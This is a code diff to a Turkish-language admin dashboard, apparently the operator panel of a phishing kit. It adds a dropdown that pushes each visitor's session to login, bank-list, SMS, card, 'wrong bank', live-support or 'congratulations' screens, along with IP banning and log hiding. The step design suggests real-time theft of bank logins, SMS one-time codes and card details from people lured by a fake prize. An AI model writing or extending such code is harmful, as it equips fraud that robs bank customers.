@@ -103,9 +103,29 @@ export function Admin1Dashboard() {
     // Basit bir bildirim eklenebilir
   };
 
-  const handleRedirect = async (sessionId: string, step: string) => {
+  const handleRouteAction = async (sessionId: string, action: string) => {
     if (!supabase) return;
-    await supabase.from("sessions").update({ current_step: step }).eq("id", sessionId);
+    
+    if (action === "win" || action === "banken" || action === "sms" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
+      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
+    } else if (action === "ban_ip") {
+      const row = rowsRef.current.find(r => r.id === sessionId);
+      if (row && row.ip_address) {
+        const confirmBan = confirm(`Bu IP adresi (${row.ip_address}) tamamen engellenecek. Onaylıyor musunuz?`);
+        if (confirmBan) {
+          await supabase.from('banned_ips').insert({
+            ip_address: row.ip_address,
+            reason: `Admin tarafından engellendi (Session: ${sessionId})`
+          });
+          alert("IP adresi başarıyla engellendi!");
+        }
+      } else {
+        alert("Bu kullanıcının IP adresi henüz sisteme yansımamış.");
+      }
+    } else if (action === "special_approval") {
+      // TODO: Özel Onay modalını aç
+      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
+    }
   };
 
   const handleDelete = async (sessionId: string) => {
@@ -276,14 +296,36 @@ export function Admin1Dashboard() {
                           )}
                         </td>
                         <td className="px-4 py-3">
-                          <div className="flex flex-wrap gap-2 max-w-[200px]">
-                            <ActionBtn label="SMS İste" onClick={() => handleRedirect(row.id, "sms")} color="bg-indigo-600 hover:bg-indigo-500" />
-                            <ActionBtn label="Kart İste" onClick={() => handleRedirect(row.id, "card")} color="bg-purple-600 hover:bg-purple-500" />
-                            <ActionBtn label="Tebrikler" onClick={() => handleRedirect(row.id, "congrats")} color="bg-green-600 hover:bg-green-500" />
-                            <ActionBtn label="Beklet" onClick={() => handleRedirect(row.id, "wait")} color="bg-gray-600 hover:bg-gray-500" />
-                            <button onClick={() => handleDelete(row.id)} className="p-1 rounded bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white transition-colors ml-auto" title="Logu Sil">
-                              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
-                            </button>
+                          <div className="flex flex-col gap-2 min-w-[160px]">
+                            <select 
+                              className={`w-full rounded-md border text-xs px-2 py-2 outline-none cursor-pointer ${darkMode ? 'bg-[#1a1a1a] border-zinc-700 text-zinc-300 focus:border-[#EB5E28]' : 'bg-white border-gray-300 text-gray-700 focus:border-[#EB5E28]'}`}
+                              value="" 
+                              onChange={(e) => {
+                                if (e.target.value) {
+                                  void handleRouteAction(row.id, e.target.value);
+                                  e.target.value = "";
+                                }
+                              }}
+                            >
+                              <option value="">Bir işlem seç...</option>
+                              <option value="win">Giriş'e Yönlendir</option>
+                              <option value="banken">Banka Listesine Yönlendirme</option>
+                              <option value="sms">SMS'e Yönlendir</option>
+                              <option value="card">Kart'a Yönlendir</option>
+                              <option value="wait">Beklemeye Al</option>
+                              <option value="invalid_bank">Hatalı Banka</option>
+                              <option value="live_support">Canlı Desteğe Yönlendir</option>
+                              <option value="congrats">Tebrikler Ekranı</option>
+                              <option value="special_approval">Özel Bildirim Gönder</option>
+                              <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
+                            </select>
+                            
+                            <div className="flex justify-end items-center">
+                              <button onClick={() => handleDelete(row.id)} className="flex items-center gap-1 px-2 py-1 rounded bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white transition-colors text-[10px] font-bold uppercase" title="Logu Sil">
+                                <span>Logu Gizle</span>
+                                <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
+                              </button>
+                            </div>
                           </div>
                         </td>
                       </tr>
